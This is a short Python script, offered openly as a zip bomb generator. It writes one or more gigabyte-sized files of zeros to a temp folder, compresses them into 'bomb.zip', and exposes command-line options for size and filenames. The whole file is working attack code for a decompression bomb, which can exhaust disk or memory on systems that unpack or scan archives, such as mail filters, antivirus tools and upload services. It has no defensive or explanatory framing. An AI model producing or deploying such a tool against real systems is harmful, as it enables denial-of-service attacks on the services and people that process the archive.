# zip-bomb.py - Create a zip bomb

import zipfile
import argparse
import os

def zipdir(path, ziph):
    # ziph is zipfile handle
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file), 
                       os.path.relpath(os.path.join(root, file), 
                                       os.path.join(path, '..')))

def create_dummy_file(dummy_filename="dummy.txt", size=1):
    
    if not os.path.exists("temp"):
        os.makedirs("temp")

    # clear the temp directory
    for file in os.listdir("temp"):
        os.remove(os.path.join("temp", file))

    for i in range(size):
        with open( "./temp/" + str(i) + dummy_filename, "w") as f:
            f.write("0" * 1024*1024*1024)

def create_zip_bomb(dummy_filename="dummy.txt", size=1, zip_filename="bomb.zip"):
    create_dummy_file(dummy_filename=dummy_filename, size=size)

    with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipdir('temp/', zipf)


    # delete the temp directory
    for file in os.listdir("temp"):
        os.remove(os.path.join("temp", file))

if __name__ == "__main__":

    args = argparse.ArgumentParser(
        description="Create a zip bomb",
        usage="python zip-bomb.py --dummy_filename dummy.txt --size 1 --zip_filename bomb.zip"
    )
    args.add_argument("--dummy_filename", help="Dummy filename", default="dummy.txt")
    args.add_argument("--size", help="Size of the dummy file(GB)", default=1, type=int)
    args.add_argument("--zip_filename", help="Zip filename", default="bomb.zip")

    args = args.parse_args()

    dummy_filename = args.dummy_filename
    size = args.size
    zip_filename = args.zip_filename

    create_zip_bomb(dummy_filename=dummy_filename, size=size, zip_filename=zip_filename)
